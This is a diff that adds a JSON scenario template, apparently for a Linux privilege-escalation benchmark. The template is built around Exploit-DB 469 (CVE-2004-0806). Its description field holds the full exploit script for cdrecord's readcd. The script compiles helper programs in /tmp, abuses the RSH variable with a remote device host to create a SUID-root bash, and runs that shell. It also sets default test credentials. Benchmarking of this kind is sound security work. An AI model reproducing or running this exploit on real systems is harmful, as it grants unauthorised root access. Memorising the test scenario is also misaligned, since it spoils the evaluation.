@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_469",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: CDRecord's ReadCD - Local Privilege Escalation (OSVDB-9779;CVE-2004-0806)\n\nExploit source code (469.sh):\n```\n#!/bin/bash\n\necho \"readcd-exp.sh -- ReadCD local exploit ( Test on cdrecord-2.01-0.a27.2mdk)\"\necho \"Author : newbug [at] chroot.org\"\necho \"Date :09.13.2004\"\necho \"IRC : irc.chroot.org #discuss\"\n\nexport READCD=/usr/bin/readcd\ncd /tmp\n\ncat > s.c <<_EOF_\n#include <unistd.h>\n#include <sys/types.h>\n#include <stdio.h>\n\nint main()\n{\nsetuid(0);setgid(0);\nchown(\"/tmp/ss\", 0, 0);\nchmod(\"/tmp/ss\", 04755);\n\nreturn 0;\n}\n\n_EOF_\n\ncat > ss.c <<_EOF_\n#include <stdio.h>\n\nint main()\n{\nsetuid(0);setgid(0);\nexecl(\"/bin/bash\",\"bash\",(char *)0);\n\nreturn 0;\n}\n_EOF_\n\ngcc -o s s.c\ngcc -o ss ss.c\n\nexport RSH=/tmp/s\n$READCD dev=REMOTE:brk.chroot.org:1,0,1 1 >/dev/null 2>&1\n/tmp/ss\n\n\n// milw0rm.com [2004-09-19]\n```",
+  "cve": "OSVDB-9779;CVE-2004-0806",
+  "exploitdb_id": "469",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_469",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
